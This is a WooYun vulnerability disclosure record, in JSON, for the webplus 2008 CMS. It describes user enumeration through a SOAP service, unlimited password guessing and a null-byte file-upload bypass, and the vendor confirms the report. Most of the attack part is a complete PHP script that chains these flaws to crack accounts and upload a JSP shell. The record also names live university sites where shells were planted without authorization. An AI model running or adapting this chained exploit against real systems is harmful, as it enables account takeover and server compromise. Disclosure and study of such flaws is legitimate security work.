{"id": 55966, "wybug_id": "wooyun-2014-059410", "wybug_title": "webplus 2008多处安全漏洞", "wybug_corp": "苏迪科技", "wybug_author": "鶆鶈", "wybug_date": "2014-05-05 12:58", "wybug_open_date": "2014-08-03 13:00", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向公众公开  简要描述： webplus 2008存在多处漏洞，容易导致系统被入侵。 详细说明：  0x1) 用户名遍历程序webservice中的SSOServices服务(URL为~/ids/services/SSOServices?wsdl)中的getUserById方法允许匿名用户通过用户id获取用户名等信息，可遍历ID获取系统中的用户名。在SoapUI里看起来比较直观：\n\n 0x2) 暴力猜解密码SSOServices服务提供了一个用于用户登录的logIn方法，由于没有登录次数限制，可用于暴力破解用户密码。\n\n 0x3) 文件上传漏洞上传提交地址：~/control/editoruploader?Type=File&articleId=&filePath=/upload，需要登录。程序关键处理代码如下：\nprivate void saveFile(FileUploadPO filePO, Field uploadField)    throws Exception  {    if (checkIsAllowUpload(filePO.getFileType(), filePO.getFileExtension()))//黑名单限制，上传文件不为jsp等后缀名就行.    {      try {        String attachmentDirRealPath = WebplusContext.getRealPath(filePO.getFilePath());        filePO.setAttachmentDirRealPath(attachmentDirRealPath);        recordFileUploadInfo(filePO);        if (_debug) {          System.out.println(\"文件上传存放位置：\" + attachmentDirRealPath);        }\t\t        File attachment = new File(attachmentDirRealPath, filePO.getNewFileName() + \".\" + filePO.getFileExtension() + \".x\"); //filePO.getFileExtension()中可插入\\0进行截断。\t\t        uploadField.write(attachment);        filePO.setAttachment(attachment);        filePO.setFileUrl(filePO.getFilePath() + \"/\" + filePO.getNewFileName() + \".\" + filePO.getFileExtension() + \".x\");        System.out.println(\"filePO.getFileUrl()====\" + filePO.getFileUrl());      } catch (Exception ex) {        _log.error(\"保存上传文件出现异常:\", ex);        ex.printStackTrace();        throw ex;      }    } else {      this.returnCode = \"202\";      this.returnMessage = \"不允许上传的文件类型!\";      if (_debug)        System.out.println(\"无效的文件类型名: \" + filePO.getFileExtension());    }  }\nfilePO.getFileExtension()的取值为上传文件的后缀名，例如后缀名为jsp\\0a便可通过checkIsAllowUpload的检验，并最后保存为jsp文件。综合1、2、3，便可以对webplus2008系统进行有效渗透，测试如下：\n<?phpfunction http_post($url, $data='', $cookie='') {\t$headers = array('SOAPAction: \"\"',\t\t\t\t\t'Content-Type: text/xml; charset=UTF-8');\t$ch = curl_init();\t\tcurl_setopt($ch, CURLOPT_URL, $url);\tcurl_setopt($ch, CURLOPT_HTTPHEADER, $headers);\tcurl_setopt($ch, CURLOPT_POSTFIELDS, $data);\tcurl_setopt($ch, CURLOPT_COOKIE, $cookie);\tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\t$res = curl_exec($ch);\tcurl_close($ch);\treturn $res;}function getUserById($url, $id=1) {\t$curl = $url.\"/ids/services/SSOServices\";\t$data = \"<soapenv:Envelope xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xmlns:xsd=\\\"http://www.w3.org/2001/XMLSchema\\\" xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:ser=\\\"http://server.ids.sudytech.com\\\">\t\t\t   <soapenv:Header/>\t\t\t   <soapenv:Body>\t\t\t\t  <ser:getUserById soapenv:encodingStyle=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\">\t\t\t\t\t <userId xsi:type=\\\"xsd:int\\\">$id</userId>\t\t\t\t  </ser:getUserById>\t\t\t   </soapenv:Body>\t\t\t</soapenv:Envelope>\";\t$xml = http_post($curl, $data);\tpreg_match(\"/<loginName xsi:type=\\\"xsd:string\\\">(.+)<\\/loginName>/\", $xml, $matches);\t$loginName = $matches[1];\tif ($loginName!='')\tprint(\"$loginName\\n\");\t/*\t中文显示为&#xaabb;\t$loginName = str_replace(';', '', $loginName);\t$loginName = str_replace(\"&#x\", \"\\\\u\", $loginName);\t*/\treturn $loginName;}function crack_pass($url, $loginName) {\t$curl=$url.\"/ids/services/SSOServices\";\tprint(\"cracking $loginName --\");\t$passwords = array($loginName,'123456','888888','000000','111111');\tforeach($passwords as $password) {\t\t$data = \"<soapenv:Envelope xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xmlns:xsd=\\\"http://www.w3.org/2001/XMLSchema\\\" xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:ser=\\\"http://server.ids.sudytech.com\\\">\t\t   <soapenv:Header/>\t\t   <soapenv:Body>\t\t\t  <ser:logIn soapenv:encodingStyle=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\">\t\t\t\t <loginName xsi:type=\\\"xsd:string\\\">$loginName</loginName>\t\t\t\t <credit xsi:type=\\\"xsd:string\\\">$password</credit>\t\t\t  </ser:logIn>\t\t   </soapenv:Body>\t\t</soapenv:Envelope>\";\t\t$headers = array('SOAPAction: \"\"',\t\t\t\t\t'Content-Type: text/xml; charset=UTF-8');\t\t$ch = curl_init($curl);\t\t\t\tcurl_setopt($ch, CURLOPT_HTTPHEADER, $headers);\t\tcurl_setopt($ch, CURLOPT_POSTFIELDS, $data); \t\tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); \t\t$xml = curl_exec($ch);\t\t$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);\t\tcurl_close($ch);\t\tif ($status == 200) {\t\t\tpreg_match(\"/<logInReturn xsi:type=\\\"xsd:string\\\">(.+)<\\/logInReturn>/\", $xml, $matches);\t\t\tprint(\"password:$password\\n\");\t\t\t$loginToken = $matches[1];\t\t\t$cookie = \"loginToken={$loginToken}_1\";\t\t\treturn $cookie;\t\t}\t}\tprint(\"failed.\\n\");\treturn false;}function upload_shell($url, $cookie=''){\t$curl = $url.\"/control/editoruploader?Type=File&articleId=&filePath=/upload\";\t$headers = array();\t$ch = curl_init($curl);\t\t$headers = array(\"Content-Type: multipart/form-data; boundary=---------------------------1548630973453\");\tcurl_setopt($ch, CURLOPT_COOKIE, $cookie);\tcurl_setopt($ch, CURLOPT_HTTPHEADER, $headers);\t$payload .= \"-----------------------------1548630973453\\r\\n\";\t$payload .= \"Content-Disposition: form-data; name=\\\"picSource\\\"\\r\\n\\r\\n\";\t$payload .= \"uploadPic\\r\\n\";\t$payload .= \"-----------------------------1548630973453\\r\\n\";\t$payload .= \"Content-Disposition: form-data; name=\\\"NewFile\\\"; filename=\\\"test.jsp\\x00x\\\"\\r\\n\";\t$payload .= \"Content-Type: application/zip\\r\\n\";\t$payload .= \"\\r\\n\";\t$payload .= \"<%=\\\"hello world.\\\"%>\\r\\n\";\t$payload .= \"-----------------------------1548630973453\";\tcurl_setopt($ch, CURLOPT_POSTFIELDS, $payload);\tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\t$html = curl_exec($ch);\t$html = iconv('UTF-8', 'GBK', $html);\t$rec = preg_match(\"/window\\.parent\\.OnUploadCompleted\\(\\d+,\\'(.+)\\\\0x\\.x\\',\\'([\\s\\S]*)\\',\\'([\\s\\S]*)\\'\\)/\", $html, $matches);\t$shell = $url.$matches[1];\tprint(\"getShell:\".$shell.\"?siteId=0&pageId=0\");\texit();}$url = \"http://webplus.ecnu.edu.cn\";$url = $argv[1];print(\"get user list:\\n\");for ($id=1; $id<100; $id++) {\t$loginNames[] = getUserById($url, $id);}foreach($loginNames as $loginName) {\tif(strlen($loginName) != '') {\t\t$cookie = crack_pass($url, $loginName);\t\tif($cookie)\tupload_shell($url, $cookie);\t}}                                                                 ?>\n   漏洞证明：  google \"webplus 2008\"，找了几个测试：http://webplus.xmu.edu.cn/upload/639a7adb-413a-4fd6-8f62-eadda3db14e6.jsp?siteId=0&pageId=0http://wzqb.upc.edu.cn/upload/58940d9b-f39a-42db-a6f3-c20c79f90382.jsp?siteId=0&pageId=0   修复方案：  无.   版权声明：转载请注明来源 鶆鶈@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2014-05-05 14:42 厂商回复： 确认并复现所述情况，正在对相关漏洞进行全面修复，在此感谢作者的友情提醒 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-30 18:51 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:170        | 力不从心)\t\t \n  给力。    \n     2014-05-30 20:31 |    \t\t打酱油的小男孩 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 俺也来乌云看看)\t\t \n  给力。    \n     2014-06-04 01:15 |    \t\tYHHK \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:4        | love hacker!love technology!)\t\t \n  看不到。。fuck    \n     2014-07-20 12:10 |    \t\t未来还没来 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 每个人都期望成为主角，却不知道世界上从来...)\t\t \n  正需要哈哈    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}